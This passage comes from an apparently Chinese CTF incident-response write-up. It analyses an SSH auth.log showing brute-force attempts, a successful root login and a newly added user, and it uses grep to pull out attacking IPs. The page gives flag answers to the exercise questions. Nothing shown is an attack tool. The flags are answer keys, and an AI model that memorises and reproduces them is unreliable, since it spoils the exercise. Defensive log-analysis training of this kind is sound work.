class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line">Aug  1 07:40:47 linux-rz sshd[7461]: Invalid user test1 from 192.168.200.35 port 33874</span><br><span class="line">Aug  1 07:40:48 linux-rz sshd[7461]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:40:48 linux-rz sshd[7461]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.35 </span><br><span class="line">Aug  1 07:40:50 linux-rz sshd[7461]: Failed password <span class="keyword">for</span> invalid user test1 from 192.168.200.35 port 33874 ssh2</span><br><span class="line">Aug  1 07:40:52 linux-rz sshd[7461]: Connection closed by invalid user test1 192.168.200.35 port 33874 [preauth]</span><br><span class="line">Aug  1 07:40:58 linux-rz sshd[7465]: Invalid user test2 from 192.168.200.35 port 51640</span><br><span class="line">Aug  1 07:41:01 linux-rz sshd[7465]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:41:01 linux-rz sshd[7465]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.35 </span><br><span class="line">Aug  1 07:41:04 linux-rz sshd[7465]: Failed password <span class="keyword">for</span> invalid user test2 from 192.168.200.35 port 51640 ssh2</span><br><span class="line">Aug  1 07:41:07 linux-rz sshd[7465]: Connection closed by invalid user test2 192.168.200.35 port 51640 [preauth]</span><br><span class="line">Aug  1 07:41:09 linux-rz sshd[7468]: Invalid user test3 from 192.168.200.35 port 48168</span><br><span class="line">Aug  1 07:41:11 linux-rz sshd[7468]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:41:11 linux-rz sshd[7468]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.35 </span><br><span class="line">Aug  1 07:41:13 linux-rz sshd[7468]: Failed password <span class="keyword">for</span> invalid user test3 from 192.168.200.35 port 48168 ssh2</span><br><span class="line">Aug  1 07:41:19 linux-rz sshd[7468]: Connection closed by invalid user test3 192.168.200.35 port 48168 [preauth]</span><br><span class="line">Aug  1 07:42:30 linux-rz sshd[7471]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.32  user=root</span><br><span class="line">Aug  1 07:42:32 linux-rz sshd[7471]: Failed password <span class="keyword">for</span> root from 192.168.200.32 port 51888 ssh2</span><br><span class="line">Aug  1 07:42:33 linux-rz sshd[7471]: Connection closed by authenticating user root 192.168.200.32 port 51888 [preauth]</span><br><span class="line">Aug  1 07:42:49 linux-rz sshd[7288]: Received disconnect from 192.168.200.2 port 54682:11: disconnected by user</span><br><span class="line">Aug  1 07:42:49 linux-rz sshd[7288]: Disconnected from user root 192.168.200.2 port 54682</span><br><span class="line">Aug  1 07:42:49 linux-rz sshd[7288]: pam_unix(sshd:session): session closed <span class="keyword">for</span> user root</span><br><span class="line">Aug  1 07:42:49 linux-rz systemd-logind[440]: Session 6 logged out. Waiting <span class="keyword">for</span> processes to <span class="built_in">exit</span>.</span><br><span class="line">Aug  1 07:42:49 linux-rz systemd-logind[440]: Removed session 6.</span><br><span class="line">Aug  1 07:46:39 linux-rz sshd[7475]: Invalid user user from 192.168.200.2 port 36149</span><br><span class="line">Aug  1 07:46:39 linux-rz sshd[7475]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:46:39 linux-rz sshd[7475]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2 </span><br><span class="line">Aug  1 07:46:41 linux-rz sshd[7475]: Failed password <span class="keyword">for</span> invalid user user from 192.168.200.2 port 36149 ssh2</span><br><span class="line">Aug  1 07:46:45 linux-rz sshd[7475]: Connection closed by invalid user user 192.168.200.2 port 36149 [preauth]</span><br><span class="line">Aug  1 07:46:45 linux-rz sshd[7478]: Invalid user user from 192.168.200.2 port 44425</span><br><span class="line">Aug  1 07:46:45 linux-rz sshd[7478]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:46:45 linux-rz sshd[7478]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2 </span><br><span class="line">Aug  1 07:46:47 linux-rz sshd[7478]: Failed password <span class="keyword">for</span> invalid user user from 192.168.200.2 port 44425 ssh2</span><br><span class="line">Aug  1 07:46:48 linux-rz sshd[7478]: Connection closed by invalid user user 192.168.200.2 port 44425 [preauth]</span><br><span class="line">Aug  1 07:46:48 linux-rz sshd[7480]: Invalid user user from 192.168.200.2 port 38791</span><br><span class="line">Aug  1 07:46:48 linux-rz sshd[7480]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:46:48 linux-rz sshd[7480]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2 </span><br><span class="line">Aug  1 07:46:50 linux-rz sshd[7480]: Failed password <span class="keyword">for</span> invalid user user from 192.168.200.2 port 38791 ssh2</span><br><span class="line">Aug  1 07:46:52 linux-rz sshd[7480]: Connection closed by invalid user user 192.168.200.2 port 38791 [preauth]</span><br><span class="line">Aug  1 07:46:52 linux-rz sshd[7482]: Invalid user user from 192.168.200.2 port 37489</span><br><span class="line">Aug  1 07:46:52 linux-rz sshd[7482]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:46:52 linux-rz sshd[7482]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2 </span><br><span class="line">Aug  1 07:46:54 linux-rz sshd[7482]: Failed password <span class="keyword">for</span> invalid user user from 192.168.200.2 port 37489 ssh2</span><br><span class="line">Aug  1 07:46:54 linux-rz sshd[7482]: Connection closed by invalid user user 192.168.200.2 port 37489 [preauth]</span><br><span class="line">Aug  1 07:46:54 linux-rz sshd[7484]: Invalid user user from 192.168.200.2 port 35575</span><br><span class="line">Aug  1 07:46:54 linux-rz sshd[7484]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:46:54 linux-rz sshd[7484]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2 </span><br><span class="line">Aug  1 07:46:56 linux-rz sshd[7484]: Failed password <span class="keyword">for</span> invalid user user from 192.168.200.2 port 35575 ssh2</span><br><span class="line">Aug  1 07:46:57 linux-rz sshd[7484]: Connection closed by invalid user user 192.168.200.2 port 35575 [preauth]</span><br><span class="line">Aug  1 07:46:57 linux-rz sshd[7486]: Invalid user hello from 192.168.200.2 port 35833</span><br><span class="line">Aug  1 07:46:57 linux-rz sshd[7486]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:46:57 linux-rz sshd[7486]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2 </span><br><span class="line">Aug  1 07:46:59 linux-rz sshd[7486]: Failed password <span class="keyword">for</span> invalid user hello from 192.168.200.2 port 35833 ssh2</span><br><span class="line">Aug  1 07:46:59 linux-rz sshd[7486]: Connection closed by invalid user hello 192.168.200.2 port 35833 [preauth]</span><br><span class="line">Aug  1 07:47:00 linux-rz sshd[7489]: Invalid user hello from 192.168.200.2 port 37653</span><br><span class="line">Aug  1 07:47:00 linux-rz sshd[7489]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:00 linux-rz sshd[7489]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2 </span><br><span class="line">Aug  1 07:47:02 linux-rz sshd[7489]: Failed password <span class="keyword">for</span> invalid user hello from 192.168.200.2 port 37653 ssh2</span><br><span class="line">Aug  1 07:47:02 linux-rz sshd[7489]: Connection closed by invalid user hello 192.168.200.2 port 37653 [preauth]</span><br><span class="line">Aug  1 07:47:02 linux-rz sshd[7491]: Invalid user hello from 192.168.200.2 port 37917</span><br><span class="line">Aug  1 07:47:02 linux-rz sshd[7491]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:02 linux-rz sshd[7491]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2 </span><br><span class="line">Aug  1 07:47:04 linux-rz sshd[7491]: Failed password <span class="keyword">for</span> invalid user hello from 192.168.200.2 port 37917 ssh2</span><br><span class="line">Aug  1 07:47:05 linux-rz sshd[7491]: Connection closed by invalid user hello 192.168.200.2 port 37917 [preauth]</span><br><span class="line">Aug  1 07:47:05 linux-rz sshd[7493]: Invalid user hello from 192.168.200.2 port 41957</span><br><span class="line">Aug  1 07:47:05 linux-rz sshd[7493]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:05 linux-rz sshd[7493]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2 </span><br><span class="line">Aug  1 07:47:08 linux-rz sshd[7493]: Failed password <span class="keyword">for</span> invalid user hello from 192.168.200.2 port 41957 ssh2</span><br><span class="line">Aug  1 07:47:08 linux-rz sshd[7493]: Connection closed by invalid user hello 192.168.200.2 port 41957 [preauth]</span><br><span class="line">Aug  1 07:47:08 linux-rz sshd[7495]: Invalid user hello from 192.168.200.2 port 39685</span><br><span class="line">Aug  1 07:47:08 linux-rz sshd[7495]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:08 linux-rz sshd[7495]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2 </span><br><span class="line">Aug  1 07:47:10 linux-rz sshd[7495]: Failed password <span class="keyword">for</span> invalid user hello from 192.168.200.2 port 39685 ssh2</span><br><span class="line">Aug  1 07:47:11 linux-rz sshd[7495]: Connection closed by invalid user hello 192.168.200.2 port 39685 [preauth]</span><br><span class="line">Aug  1 07:47:11 linux-rz sshd[7497]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2  user=root</span><br><span class="line">Aug  1 07:47:13 linux-rz sshd[7497]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 34703 ssh2</span><br><span class="line">Aug  1 07:47:15 linux-rz sshd[7497]: Connection closed by authenticating user root 192.168.200.2 port 34703 [preauth]</span><br><span class="line">Aug  1 07:47:16 linux-rz sshd[7499]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2  user=root</span><br><span class="line">Aug  1 07:47:18 linux-rz sshd[7499]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 46671 ssh2</span><br><span class="line">Aug  1 07:47:18 linux-rz sshd[7499]: Connection closed by authenticating user root 192.168.200.2 port 46671 [preauth]</span><br><span class="line">Aug  1 07:47:18 linux-rz sshd[7501]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2  user=root</span><br><span class="line">Aug  1 07:47:20 linux-rz sshd[7501]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 39967 ssh2</span><br><span class="line">Aug  1 07:47:20 linux-rz sshd[7501]: Connection closed by authenticating user root 192.168.200.2 port 39967 [preauth]</span><br><span class="line">Aug  1 07:47:20 linux-rz sshd[7503]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2  user=root</span><br><span class="line">Aug  1 07:47:22 linux-rz sshd[7503]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 46647 ssh2</span><br><span class="line">Aug  1 07:47:23 linux-rz sshd[7503]: Connection closed by authenticating user root 192.168.200.2 port 46647 [preauth]</span><br><span class="line">Aug  1 07:47:23 linux-rz sshd[7505]: Accepted password <span class="keyword">for</span> root from 192.168.200.2 port 46563 ssh2</span><br><span class="line">Aug  1 07:47:23 linux-rz sshd[7505]: pam_unix(sshd:session): session opened <span class="keyword">for</span> user root by (uid=0)</span><br><span class="line">Aug  1 07:47:23 linux-rz systemd-logind[440]: New session 7 of user root.</span><br><span class="line">Aug  1 07:47:23 linux-rz sshd[7525]: Invalid user  from 192.168.200.2 port 37013</span><br><span class="line">Aug  1 07:47:23 linux-rz sshd[7525]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:23 linux-rz sshd[7525]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2 </span><br><span class="line">Aug  1 07:47:26 linux-rz sshd[7525]: Failed password <span class="keyword">for</span> invalid user  from 192.168.200.2 port 37013 ssh2</span><br><span class="line">Aug  1 07:47:28 linux-rz sshd[7525]: Connection closed by invalid user  192.168.200.2 port 37013 [preauth]</span><br><span class="line">Aug  1 07:47:28 linux-rz sshd[7528]: Invalid user  from 192.168.200.2 port 37545</span><br><span class="line">Aug  1 07:47:28 linux-rz sshd[7528]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:28 linux-rz sshd[7528]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2 </span><br><span class="line">Aug  1 07:47:30 linux-rz sshd[7528]: Failed password <span class="keyword">for</span> invalid user  from 192.168.200.2 port 37545 ssh2</span><br><span class="line">Aug  1 07:47:30 linux-rz sshd[7528]: Connection closed by invalid user  192.168.200.2 port 37545 [preauth]</span><br><span class="line">Aug  1 07:47:30 linux-rz sshd[7530]: Invalid user  from 192.168.200.2 port 39111</span><br><span class="line">Aug  1 07:47:30 linux-rz sshd[7530]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:30 linux-rz sshd[7530]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2 </span><br><span class="line">Aug  1 07:47:32 linux-rz sshd[7530]: Failed password <span class="keyword">for</span> invalid user  from 192.168.200.2 port 39111 ssh2</span><br><span class="line">Aug  1 07:47:32 linux-rz sshd[7530]: Connection closed by invalid user  192.168.200.2 port 39111 [preauth]</span><br><span class="line">Aug  1 07:47:33 linux-rz sshd[7532]: Invalid user  from 192.168.200.2 port 35173</span><br><span class="line">Aug  1 07:47:33 linux-rz sshd[7532]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:33 linux-rz sshd[7532]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2 </span><br><span class="line">Aug  1 07:47:35 linux-rz sshd[7532]: Failed password <span class="keyword">for</span> invalid user  from 192.168.200.2 port 35173 ssh2</span><br><span class="line">Aug  1 07:47:37 linux-rz sshd[7532]: Connection closed by invalid user  192.168.200.2 port 35173 [preauth]</span><br><span class="line">Aug  1 07:47:37 linux-rz sshd[7534]: Invalid user  from 192.168.200.2 port 45807</span><br><span class="line">Aug  1 07:47:37 linux-rz sshd[7534]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:37 linux-rz sshd[7534]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.2 </span><br><span class="line">Aug  1 07:47:39 linux-rz sshd[7534]: Failed password <span class="keyword">for</span> invalid user  from 192.168.200.2 port 45807 ssh2</span><br><span class="line">Aug  1 07:47:41 linux-rz sshd[7534]: Connection closed by invalid user  192.168.200.2 port 45807 [preauth]</span><br><span class="line">Aug  1 07:50:29 linux-rz sshd[7505]: pam_unix(sshd:session): session closed <span class="keyword">for</span> user root</span><br><span class="line">Aug  1 07:50:29 linux-rz systemd-logind[440]: Session 7 logged out. Waiting <span class="keyword">for</span> processes to <span class="built_in">exit</span>.</span><br><span class="line">Aug  1 07:50:29 linux-rz systemd-logind[440]: Removed session 7.</span><br><span class="line">Aug  1 07:50:37 linux-rz sshd[7539]: Accepted password <span class="keyword">for</span> root from 192.168.200.2 port 48070 ssh2</span><br><span class="line">Aug  1 07:50:37 linux-rz sshd[7539]: pam_unix(sshd:session): session opened <span class="keyword">for</span> user root by (uid=0)</span><br><span class="line">Aug  1 07:50:37 linux-rz systemd-logind[440]: New session 8 of user root.</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new group: name=test2, GID=1000</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/sh</span><br><span class="line">Aug  1 07:50:52 linux-rz passwd[7563]: pam_unix(passwd:chauthtok): password changed <span class="keyword">for</span> test2</span><br><span class="line">Aug  1 07:50:56 linux-rz sshd[7539]: Received disconnect from 192.168.200.2 port 48070:11: disconnected by user</span><br><span class="line">Aug  1 07:50:56 linux-rz sshd[7539]: Disconnected from user root 192.168.200.2 port 48070</span><br><span class="line">Aug  1 07:50:56 linux-rz sshd[7539]: pam_unix(sshd:session): session closed <span class="keyword">for</span> user root</span><br><span class="line">Aug  1 07:50:56 linux-rz systemd-logind[440]: Session 8 logged out. Waiting <span class="keyword">for</span> processes to <span class="built_in">exit</span>.</span><br><span class="line">Aug  1 07:50:56 linux-rz systemd-logind[440]: Removed session 8.</span><br><span class="line">Aug  1 07:52:57 linux-rz sshd[7606]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=192.168.200.31  user=root</span><br><span class="line">Aug  1 07:52:59 linux-rz sshd[7606]: Failed password <span class="keyword">for</span> root from 192.168.200.31 port 40364 ssh2</span><br><span class="line">Aug  1 07:53:01 linux-rz sshd[7606]: Connection closed by authenticating user root 192.168.200.31 port 40364 [preauth]</span><br><span class="line">Aug  1 08:01:26 linux-rz sshd[748]: Received disconnect from 192.168.200.2 port 50378:11: disconnected by user</span><br><span class="line">Aug  1 08:01:26 linux-rz sshd[748]: Disconnected from user root 192.168.200.2 port 50378</span><br><span class="line">Aug  1 08:01:26 linux-rz sshd[748]: pam_unix(sshd:session): session closed <span class="keyword">for</span> user root</span><br><span class="line">Aug  1 08:01:26 linux-rz systemd-logind[440]: Session 3 logged out. Waiting <span class="keyword">for</span> processes to <span class="built_in">exit</span>.</span><br><span class="line">Aug  1 08:01:26 linux-rz systemd-logind[440]: Removed session 3.</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: new group: name=debian, GID=1001</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: new user: name=debian, UID=1001, GID=1001, home=/home/debian, shell=/bin/bash</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to group <span class="string">&#x27;adm&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to group <span class="string">&#x27;dialout&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to group <span class="string">&#x27;cdrom&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to group <span class="string">&#x27;floppy&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to group <span class="string">&#x27;sudo&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to group <span class="string">&#x27;audio&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to group <span class="string">&#x27;dip&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to group <span class="string">&#x27;video&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to group <span class="string">&#x27;plugdev&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to group <span class="string">&#x27;netdev&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to shadow group <span class="string">&#x27;adm&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to shadow group <span class="string">&#x27;dialout&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to shadow group <span class="string">&#x27;cdrom&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to shadow group <span class="string">&#x27;floppy&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to shadow group <span class="string">&#x27;sudo&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to shadow group <span class="string">&#x27;audio&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to shadow group <span class="string">&#x27;dip&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to shadow group <span class="string">&#x27;video&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to shadow group <span class="string">&#x27;plugdev&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add <span class="string">&#x27;debian&#x27;</span> to shadow group <span class="string">&#x27;netdev&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 passwd[493]: password <span class="keyword">for</span> <span class="string">&#x27;debian&#x27;</span> changed by <span class="string">&#x27;root&#x27;</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 <span class="built_in">sudo</span>:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/touch /var/log/aws114_ssm_agent_installation.<span class="built_in">log</span></span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 <span class="built_in">sudo</span>: pam_unix(<span class="built_in">sudo</span>:session): session opened <span class="keyword">for</span> user root by (uid=0)</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 <span class="built_in">sudo</span>: pam_unix(<span class="built_in">sudo</span>:session): session closed <span class="keyword">for</span> user root</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 sshd[544]: Server listening on 0.0.0.0 port 22.</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: Watching system buttons on /dev/input/event1 (Power Button)</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 sshd[544]: Server listening on :: port 22.</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: Watching system buttons on /dev/input/event2 (Sleep Button)</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: Watching system buttons on /dev/input/event0 (AT Translated Set 2 keyboard)</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: New seat seat0.</span><br><span class="line">Jul 20 05:18:05 ip-10-0-10-2 passwd[418]: password <span class="keyword">for</span> <span class="string">&#x27;debian&#x27;</span> changed by <span class="string">&#x27;root&#x27;</span></span><br><span class="line">Jul 20 05:18:05 ip-10-0-10-2 systemd-logind[433]: Watching system buttons on /dev/input/event1 (Power Button)</span><br><span class="line">Jul 20 05:18:05 ip-10-0-10-2 sshd[452]: Server listening on 0.0.0.0 port 22.</span><br><span class="line">Jul 20 05:18:06 ip-10-0-10-2 sshd[452]: Server listening on :: port 22.</span><br><span class="line">Jul 20 05:18:06 ip-10-0-10-2 systemd-logind[433]: Watching system buttons on /dev/input/event2 (Sleep Button)</span><br><span class="line">Jul 20 05:18:06 ip-10-0-10-2 systemd-logind[433]: Watching system buttons on /dev/input/event0 (AT Translated Set 2 keyboard)</span><br><span class="line">Jul 20 05:18:06 ip-10-0-10-2 systemd-logind[433]: New seat seat0.</span><br></pre></td></tr></table></figure>

<p>一个一个找效率太低,我们用grep进行正则匹配</p>
<h3 id="有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割"><a href="#有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割" class="headerlink" title="有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割"></a>有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/auth.log.1|grep -a <span class="string">&quot;Failed password for root&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Aug  1 07:42:32 linux-rz sshd[7471]: Failed password <span class="keyword">for</span> root from 192.168.200.32 port 51888 ssh2</span><br><span class="line">Aug  1 07:47:13 linux-rz sshd[7497]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 34703 ssh2</span><br><span class="line">Aug  1 07:47:18 linux-rz sshd[7499]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 46671 ssh2</span><br><span class="line">Aug  1 07:47:20 linux-rz sshd[7501]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 39967 ssh2</span><br><span class="line">Aug  1 07:47:22 linux-rz sshd[7503]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 46647 ssh2</span><br><span class="line">Aug  1 07:52:59 linux-rz sshd[7606]: Failed password <span class="keyword">for</span> root from 192.168.200.31 port 40364 ssh2</span><br></pre></td></tr></table></figure>

<p>把ip列出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">192.168.200.32</span><br><span class="line">192.168.200.2</span><br><span class="line">192.168.200.31</span><br><span class="line">那么flag就是flag&#123;192.168.200.2,192.168.200.31,192.168.200.32&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割"><a href="#ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割" class="headerlink" title="ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割"></a>ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</h3><p>找Accepted password即可</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/auth.log.1|grep -a <span class="string">&quot;Accepted password for root&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Aug  1 07:47:23 linux-rz sshd[7505]: Accepted password <span class="keyword">for</span> root from 192.168.200.2 port 46563 ssh2</span><br><span class="line">Aug  1 07:50:37 linux-rz sshd[7539]: Accepted password <span class="keyword">for</span> root from 192.168.200.2 port 48070 ssh2</span><br></pre></td></tr></table></figure>

<p>那么flag就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure>

<h3 id="爆破用户名字典是什么？如果有多个使用”-”分割"><a href="#爆破用户名字典是什么？如果有多个使用”-”分割" class="headerlink" title="爆破用户名字典是什么？如果有多个使用”,”分割"></a>爆破用户名字典是什么？如果有多个使用”,”分割</h3><p>找登录错误的即可</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/auth.log.1|grep -a <span class="string">&quot;Failed password&quot;</span></span><br></pre></td></tr></table></figure>

